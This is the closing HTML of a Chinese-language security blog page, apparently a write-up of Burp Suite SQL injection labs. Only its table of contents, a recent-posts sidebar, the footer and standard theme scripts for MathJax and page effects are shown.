href="#Lab-Blind-SQL-injection-with-conditional-errors"><span class="toc-number">4.</span> <span class="toc-text">Lab: Blind SQL injection with conditional errors</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lab-Blind-SQL-injection-with-time-delays-and-information-retrieval"><span class="toc-number">5.</span> <span class="toc-text">Lab: Blind SQL injection with time delays and information retrieval</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lab-Blind-SQL-injection-with-out-of-band-interaction"><span class="toc-number">6.</span> <span class="toc-text">Lab: Blind SQL injection with out-of-band interaction</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%B8%A6%E5%A4%96-OAST-%E6%8A%80%E6%9C%AF%E5%8F%91%E5%8A%A8%E7%9B%B2%E6%B3%A8"><span class="toc-number">6.1.</span> <span class="toc-text">利用带外(OAST)技术发动盲注</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E5%92%8C%E6%A3%80%E6%B5%8Bsql%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E9%98%B2%E5%BE%A1"><span class="toc-number">8.</span> <span class="toc-text">总结和检测sql注入以及防御</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%B8%8D%E5%90%8C%E9%80%A0%E6%88%90%E7%9A%84%E5%B7%AE%E5%BC%82"><span class="toc-number">8.1.</span> <span class="toc-text">一些数据库的不同造成的差异</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">8.2.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">9.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/06/burp_authentication/" title="Burpsuite靶场----身份认证专题">Burpsuite靶场----身份认证专题</a><time datetime="2022-03-06T05:30:09.550Z" title="发表于 2022-03-06 13:30:09">2022-03-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/02/burp_sql/" title="Burpsuite靶场----SQL注入专题">Burpsuite靶场----SQL注入专题</a><time datetime="2022-03-02T12:36:45.594Z" title="发表于 2022-03-02 20:36:45">2022-03-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/02/26/tryme/" title="Introduction to Web Hacking">Introduction to Web Hacking</a><time datetime="2022-02-26T15:48:12.928Z" title="发表于 2022-02-26 23:48:12">2022-02-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/02/21/lpy3/" title="python_spider学习（三）">python_spider学习（三）</a><time datetime="2022-02-21T10:00:04.735Z" title="发表于 2022-02-21 18:00:04">2022-02-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/02/20/lpy2/" title="python_spider学习（二）">python_spider学习（二）</a><time datetime="2022-02-20T04:44:24.443Z" title="发表于 2022-02-20 12:44:24">2022-02-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By Evylnk</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi,希望能够帮到你。</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.2
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
+            const target = node.parentNode
+            if (target.nodeName.toLowerCase() === 'li') {
+              target.parentNode.classList.add('has-jax')
+            } else {
+              target.classList.add('has-jax')
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
